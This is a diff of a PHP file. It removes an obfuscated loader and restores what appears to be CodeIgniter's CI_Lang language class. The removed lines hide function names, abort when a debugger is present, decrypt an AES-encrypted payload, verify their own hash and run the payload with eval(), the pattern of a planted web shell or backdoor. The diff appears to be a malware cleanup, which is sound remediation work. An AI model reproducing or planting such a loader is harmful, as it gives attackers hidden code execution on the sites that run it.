@@ -1,28 +1,179 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_th7b8vzz=('bas'.'e64'.'_de'.'cod'.'e');
-$_stlxi80d=('gzu'.'nco'.'mpr'.'ess');
-$_csdqs52p=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_xhk1pudj='K7Bl3wg6';
-$_gd1az3qe='UTHM/fcg';
-$_rsidgtyx='LDn6rGyw';
-$_vo1gb2il='UlbG1f5r';
-$_z4kuy26n='/LHxVZTojYY=';
-$_uo4n4hmt='PEXowyGf';
-$_e0gr8bg3='1JmHyuyl';
-$_p731t3tp='tTdrFA==';
-$_p9l5lr69=$_th7b8vzz($_rsidgtyx.$_xhk1pudj.$_vo1gb2il.$_gd1az3qe.$_z4kuy26n);
-$_v03kgyzg=$_th7b8vzz($_uo4n4hmt.$_e0gr8bg3.$_p731t3tp);
-$_jfhugsax=$_th7b8vzz('4PdFXycAccJyqHNmr8QCDDUWDXYCubPgOU+IO45WcPLYPHXoTHlV9UEGzGYbHJwhzTpzZnnYp1m+sL3biES8UsUw99TuVurQGKzp6rgsErkoOK8sd0Ign5vysupmq+ks7sbLhuBtz2I+YgHtyqqC62g0v8sh1t4r5b3L5XIbPFQPHclkHyLGotpT58sMhX5KDAuFTjO2umU5Yc2WgnDLO59nePaI3+FnReAXKNnKKW53RhprPCM++e9pD99lyc9NbatVD8zldTTzYOSKi0vSBmMesu3fvY4D0IeGGqsmjCCxL/sZxLlPipDJQb9IYhD9zS6ROvQL4vtMHlWfeLPLltSHSRuBtkt4cRNTf6JYdl4WSShA/FOTCQSFp8aR0K8/OBIQoTTvBrQNOOdm4zQu+nUPXKxWGGh3V0F2TXICh37f49NfiWEobaxWsRZRy+o8sRq6C9DU/BUcBqnshn6pxYLnvQeMFw2P84Tk5BnjPjoByld6D9lX933Ri9BSbgBW+HvW7NX40syh7ilEK3IMDXHf4hTyTk9PvKi1ColQbdQ/DT7q5CJA6wF0wncNZJo6lElZEsNSG6y8UHJzwyd4AaLazKJAHz/ic06U4ciW8j6r3SjZ7ny1LU6oDlf4wOdzdpG5q+FZBXavf5U+XbIgzjGbVE8lsUwKuWqcFm3IiSDbd1hBKx2b9kljUv4hNLqH0hPI44x3yS8QrVAKhkiL+pEp7zc+UaNp2GfUV147NNyu62L+cks0KYNafYb7z7vtB3Y9j8/7tmTiy0d2XD96RbI+aEbL9SHc22yA5VgL4x2ExEcVG49Xv4BsS1Oq0QNlg5r3NfX7cfoo3LTcmosq9rKIJKzldhT+4BDH1fbKDEZZs4AJIvHE3xa8dDkesgaapPVyoYig0YzdTwYoFoW5vuB4UORlRPvMAtQbG6jEFkr5eRlEH4VI0xcKm2SgHZGktR0atFzYNfcI5/4+LGMJ+KQTJ7SQLP6ZYo5+shg0iVAQc6s/nXx+qpd5a+Br6Ee/2f6k5KtYpRm+oFLGCqJHUSfNUi+8kCERXU8Y6qMGyuNVBy11kOlKj0FSeHnert/i4btiovwxGRxBmgbQXqh4NQ==');
-$_je81qsav=$_csdqs52p($_jfhugsax,'aes-256-cbc',$_p9l5lr69,OPENSSL_RAW_DATA,$_v03kgyzg);
-if($_je81qsav===false){exit;}
-$_wy1iryk1=$_stlxi80d($_je81qsav);
-if($_wy1iryk1===false){exit;}
-$_o67nd61g='d3ea8602b9f02355ca35cc17eb93ec0d24828c02cebb256622a0615e63a08438';
-$_q0tis3ba=@file_get_contents(__FILE__);
-if($_q0tis3ba!==false){
-$_clculbhz=str_replace($_o67nd61g,"0000000000000000000000000000000000000000000000000000000000000000",$_q0tis3ba);
-$_snvs8xz6=hash("sha256",$_clculbhz);
-if($_snvs8xz6!==$_o67nd61g){@http_response_code(403);exit;}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+
+
+
+class CI_Lang {
+
+
+
+
+
+public $language = array();
+
+
+
+
+
+public $is_loaded = array();
+
+
+
+
+
+public function __construct()
+{
+log_message('info', 'Language Class Initialized');
 }
-eval($_wy1iryk1);
+
+
+
+
+
+
+
+
+
+
+
+
+public function load($langfile, $idiom = '', $return = FALSE, $add_suffix = TRUE, $alt_path = '')
+{
+if (is_array($langfile))
+{
+foreach ($langfile as $value)
+{
+$this->load($value, $idiom, $return, $add_suffix, $alt_path);
+}
+return;
+}
+$langfile = str_replace('.php', '', $langfile);
+if ($add_suffix === TRUE)
+{
+$langfile = preg_replace('/_lang$/', '', $langfile).'_lang';
+}
+$langfile .= '.php';
+if (empty($idiom) OR ! preg_match('/^[a-z_-]+$/i', $idiom))
+{
+$config =& get_config();
+$idiom = empty($config['language']) ? 'english' : $config['language'];
+}
+if ($return === FALSE && isset($this->is_loaded[$langfile]) && $this->is_loaded[$langfile] === $idiom)
+{
+return;
+}
+
+$basepath = BASEPATH.'language/'.$idiom.'/'.$langfile;
+if (($found = file_exists($basepath)) === TRUE)
+{
+include($basepath);
+}
+
+if ($alt_path !== '')
+{
+$alt_path .= 'language/'.$idiom.'/'.$langfile;
+if (file_exists($alt_path))
+{
+include($alt_path);
+$found = TRUE;
+}
+}
+else
+{
+foreach (get_instance()->load->get_package_paths(TRUE) as $package_path)
+{
+$package_path .= 'language/'.$idiom.'/'.$langfile;
+if ($basepath !== $package_path && file_exists($package_path))
+{
+include($package_path);
+$found = TRUE;
+break;
+}
+}
+}
+if ($found !== TRUE)
+{
+show_error('Unable to load the requested language file: language/'.$idiom.'/'.$langfile);
+}
+if ( ! isset($lang) OR ! is_array($lang))
+{
+log_message('error', 'Language file contains no data: language/'.$idiom.'/'.$langfile);
+if ($return === TRUE)
+{
+return array();
+}
+return;
+}
+if ($return === TRUE)
+{
+return $lang;
+}
+$this->is_loaded[$langfile] = $idiom;
+$this->language = array_merge($this->language, $lang);
+log_message('info', 'Language file loaded: language/'.$idiom.'/'.$langfile);
+return TRUE;
+}
+
+
+
+
+
+
+
+
+
+
+public function line($line, $log_errors = TRUE)
+{
+$value = isset($this->language[$line]) ? $this->language[$line] : FALSE;
+
+if ($value === FALSE && $log_errors === TRUE)
+{
+log_message('error', 'Could not find the language line "'.$line.'"');
+}
+return $value;
+}
+}
